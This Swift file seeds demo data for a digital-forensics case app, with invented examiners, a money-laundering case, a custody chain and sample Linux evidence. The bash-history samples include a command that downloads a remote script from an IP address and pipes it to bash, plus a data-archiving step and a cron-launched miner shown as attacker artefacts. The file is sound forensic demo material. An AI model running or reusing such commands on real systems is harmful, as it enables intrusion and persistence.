//
//  SampleData.swift
//  Strata
//
//  Seed/preview data. Settings are seeded in full (they're small and become the
//  app's defaults). Exhibits + custody get a representative case. The evidence
//  corpus is large — one OS is seeded here as a worked example; port the rest
//  from /DesignReference/strata-viewer.html (the `CATS` and `FILES` objects map
//  1:1 onto ArtifactCategory / FileNode).
//

import Foundation

enum SampleData {

    // MARK: Settings (becomes the default catalogues)

    static var settings: StrataSettings {
        var s = StrataSettings()
        s.examiners = [
            .init(name: "N. Borg", role: "Senior forensic analyst", org: "FIAU Malta"),
            .init(name: "A. Vella", role: "Forensic analyst", org: "FIAU Malta"),
            .init(name: "D. Spiteri", role: "DFIR examiner", org: "FIAU Malta"),
            .init(name: "M. Grech", role: "Analyst", org: "FIAU Malta")
        ]
        s.entities = [
            .init(name: "FIAU Malta", kind: "Internal"),
            .init(name: "Malta Police — FCID", kind: "Law enforcement"),
            .init(name: "Office of the Attorney General", kind: "Prosecution"),
            .init(name: "Court of Magistrates", kind: "Judiciary"),
            .init(name: "Europol", kind: "International"),
            .init(name: "Foreign FIU (Egmont)", kind: "International"),
            .init(name: "External forensic lab", kind: "Forensic lab"),
            .init(name: "Evidence store", kind: "Storage")
        ]
        s.tools = [
            .init(name: "FTK Imager", type: "Imager", isAvailable: true),
            .init(name: "Cellebrite UFED", type: "Imager", isAvailable: true),
            .init(name: "Magnet ACQUIRE", type: "Imager", isAvailable: true),
            .init(name: "Tableau Imager", type: "Imager", isAvailable: false),
            .init(name: "dc3dd", type: "Imager", isAvailable: true),
            .init(name: "X-Ways", type: "Imager", isAvailable: false)
        ]
        s.writeBlockers = [
            .init(name: "Tableau T8u", isAvailable: true),
            .init(name: "Tableau T356789iu", isAvailable: true),
            .init(name: "WiebeTech", isAvailable: false),
            .init(name: "Software write-block", isAvailable: true)
        ]
        s.hashAlgorithms = [
            .init(name: "SHA-256", isAvailable: true, isDefault: true),
            .init(name: "SHA-1", isAvailable: true),
            .init(name: "MD5", isAvailable: true),
            .init(name: "SHA-512", isAvailable: false),
            .init(name: "BLAKE3", isAvailable: false)
        ]
        s.caseTypes = ["Money laundering", "Terrorist financing", "Fraud", "Sanctions evasion",
                       "Market abuse", "Cyber-enabled crime", "Internal investigation"]
        s.legalBases = ["Production order", "Search & seizure warrant", "Court order",
                        "FIAU Act — analysis request", "Mutual legal assistance (MLA)"]
        s.acquisitionMethods = ["Physical (bit-stream)", "Logical", "Targeted / selective", "Live acquisition", "Cloud / API"]
        s.deviceTypes = ["Laptop", "Desktop", "Mobile phone", "Tablet", "External HDD", "SSD",
                         "USB drive", "Server", "Cloud acquisition", "Disk image"]
        s.transferPurposes = ["Analysis assignment", "Peer / QA review", "Court submission",
                              "Inter-agency referral", "Return to owner", "Long-term storage"]
        s.transferMethods = ["Hand-delivered (in person)", "Secure courier", "Encrypted network transfer", "Secure evidence portal"]
        s.storageLocations = ["Evidence locker B — shelf 4", "Evidence locker A", "Secure server vault", "Off-site archive"]
        return s
    }

    // MARK: Case + exhibits

    static var theCase: DigitalCase {
        var c = DigitalCase(reference: "FIAU-2026-0114", title: "Operation Tramontana",
                    type: "Money laundering", priority: .high, classification: .confidential,
                    requestingAuthority: "Court of Magistrates", legalBasis: "Production order",
                    authorizationRef: "PO 487/2026", leadExaminer: "N. Borg — FIAU Malta",
                    synopsis: "Suspected layering of proceeds through three Maltese corporate entities.")
        c.state = .review
        c.retention = .tenYears
        c.disposition = .retainSealed
        return c
    }

    static var exhibits: [Exhibit] {
        [
            Exhibit(fileName: "WIN11-FINANCE.E01", os: .windows, osVersion: "Windows 11 23H2",
                    osBuild: "22631 · x64", filesystem: "NTFS", format: "EnCase · 4 seg",
                    sizeGB: 498, acquisitionHash: "9f2a…d3e41c", encryption: .locked(.bitLocker)),
            Exhibit(fileName: "app-prod-02.qcow2", os: .linux, osVersion: "Ubuntu 24.04 LTS",
                    osBuild: "kernel 6.8", filesystem: "ext4", format: "QEMU",
                    sizeGB: 64, acquisitionHash: "a1d0…b3c9e4", encryption: .none),
            Exhibit(fileName: "suspect-iphone.tar", os: .iOS, osVersion: "iOS 17.5.1",
                    osBuild: "21F90 · iPhone15,2", filesystem: "backup", format: "backup",
                    sizeGB: 58, acquisitionHash: "7e1c…0a9b3f", encryption: .unlocked(.iosBackup))
        ]
    }

    // MARK: Custody chain (collection already recorded)

    static var custody: CustodyChain {
        var c = CustodyChain()
        c.recordCollection(
            CustodyEvent(kind: .collection,
                         from: "M. Camilleri (registered keeper)",
                         to: "N. Borg — FIAU Malta",
                         timestamp: "2026-06-09 14:22 CEST",
                         method: "Physical (bit-stream) · Tableau T8u · FTK Imager",
                         purpose: "Initial collection",
                         seal: "FIAU-SEAL-00219",
                         notes: "Powered off on seizure · BitLocker enabled",
                         evidenceHash: "9f2a4c7e1b6d08af33c95e2740b81a55c0e7d9128bafef74a61029cd55d3e41c")
        )
        return c
    }

    // MARK: Activity log (examiner journal — provenance, not access control)

    static var activity: ActivityLog {
        var a = ActivityLog()
        a.log(.caseOpened,         by: "N. Borg",  target: "FIAU-2026-0114", detail: "Case opened",                          at: "2026-06-08 10:12Z")
        a.log(.imageIngested,      by: "N. Borg",  target: "WIN11-FINANCE.E01", detail: "Ingested · NTFS · BitLocker",       at: "2026-06-09 14:40Z")
        a.log(.integrityMismatch,  by: "System",   target: "REDTEAM-WS.vhdx", detail: "Hash mismatch — transfer blocked",     at: "2026-06-09 14:48Z")
        a.log(.imageProcessed,     by: "N. Borg",  target: "3 images",        detail: "Batch processing · 2× parallel",      at: "2026-06-09 15:02Z")
        a.log(.custodyTransferred, by: "N. Borg",  target: "EXH-001",         detail: "→ A. Vella · hash verified",          at: "2026-06-10 09:30Z")
        a.log(.findingTagged,      by: "A. Vella", target: "suspect-iphone.tar", detail: "“moved the funds…” · IOC",         at: "2026-06-14 10:55Z")
        a.log(.reportExported,     by: "A. Vella", target: "EXH-001",         detail: "Custody PDF exported",                 at: "2026-06-14 11:08Z")
        return a
    }

    static var linuxEvidence: EvidenceSet {
        EvidenceSet(
            exhibitID: UUID(),
            os: .linux,
            categories: [
                ArtifactCategory(key: "auth", name: "Auth log", artifactClass: .security,
                                 symbol: "key.fill", totalCount: 18422, samples: [
                    ArtifactRecord(timestamp: "2026-06-09 02:14:51",
                                   title: "sshd: Accepted publickey for deploy from 185.x",
                                   source: "/var/log/auth.log",
                                   fields: [
                                       .init(key: "Service", value: "sshd"),
                                       .init(key: "User", value: "deploy"),
                                       .init(key: "Method", value: "publickey"),
                                       .init(key: "Source IP", value: "185.220.101.47"),
                                       .init(key: "Port", value: "54122")
                                   ],
                                   raw: "Jun  9 02:14:51 app-prod-02 sshd[2291]: Accepted publickey for deploy from 185.220.101.47 port 54122 ssh2: RSA SHA256:…")
                ]),
                ArtifactCategory(key: "bash", name: "Bash history", artifactClass: .user,
                                 symbol: "terminal", totalCount: 1140, samples: [
                    ArtifactRecord(timestamp: "2026-06-09 02:15:20",
                                   title: "curl -fsSL hxxp://185.x/x.sh | bash",
                                   source: "/home/deploy/.bash_history",
                                   fields: [
                                       .init(key: "Command", value: "curl -fsSL http://185.220.101.47/x.sh | bash"),
                                       .init(key: "User", value: "deploy")
                                   ]),
                    ArtifactRecord(timestamp: "2026-06-09 02:17:02",
                                   title: "tar czf /tmp/db.tgz /var/lib/pgsql",
                                   source: "/home/deploy/.bash_history",
                                   fields: [.init(key: "Command", value: "tar czf /tmp/db.tgz /var/lib/pgsql")])
                ]),
                ArtifactCategory(key: "cron", name: "Cron & systemd timers", artifactClass: .persistence,
                                 symbol: "gearshape.2.fill", totalCount: 34, samples: [
                    ArtifactRecord(timestamp: "2026-06-09 02:16:40",
                                   title: "@reboot /opt/.x/miner (deploy crontab)",
                                   source: "/var/spool/cron/crontabs/deploy",
                                   fields: [
                                       .init(key: "Schedule", value: "@reboot"),
                                       .init(key: "Command", value: "/opt/.x/miner"),
                                       .init(key: "User", value: "deploy")
                                   ])
                ])
            ],
            fileTree: [
                FileNode(name: "/", isDirectory: true, children: [
                    FileNode(name: "home", isDirectory: true, children: [
                        FileNode(name: "deploy", isDirectory: true, children: [
                            FileNode(name: ".bash_history", isDirectory: false, size: "12 KB", modified: "2026-06-09 02:17"),
                            FileNode(name: ".ssh", isDirectory: true, children: [
                                FileNode(name: "authorized_keys", isDirectory: false, size: "1.1 KB", modified: "2026-06-09 02:14")
                            ])
                        ])
                    ]),
                    FileNode(name: "var", isDirectory: true, children: [
                        FileNode(name: "log", isDirectory: true, children: [
                            FileNode(name: "auth.log", isDirectory: false, size: "8.8 MB", modified: "2026-06-09 02:17")
                        ])
                    ])
                ])
            ]
        )
    }
}
